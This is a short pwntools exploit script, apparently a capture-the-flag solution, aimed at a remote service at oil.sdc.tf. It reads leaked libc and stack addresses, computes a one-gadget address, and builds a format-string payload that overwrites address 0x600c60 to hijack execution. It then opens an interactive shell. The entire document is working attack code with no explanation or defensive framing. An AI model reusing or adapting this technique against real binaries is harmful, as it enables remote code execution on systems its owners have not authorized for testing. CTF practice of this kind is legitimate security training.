from pwn import *

BEDUG = False

context.clear(arch = 'amd64')
libc = ELF('./libc.so.6')

if (BEDUG==True):
    io = process('./chall_patched')
    gdb.attach(io)
else:
    io = remote('oil.sdc.tf', 1337)

arr = io.recvline().split(b', ')
libc.address = int(arr[0], 16) - libc.sym['puts']
stack = int(arr[2], 16)
log.info('Stack: '+hex(stack))
log.info('Libc: '+hex(libc.address))

og = libc.address+0x10a2fc

writes = {0x600c60:og}

pl = fmtstr_payload(8, writes, 0, 'short')+b'\0'*150
print(pl)

io.sendlineafter(b'to clean it?\n', pl)
io.interactive()
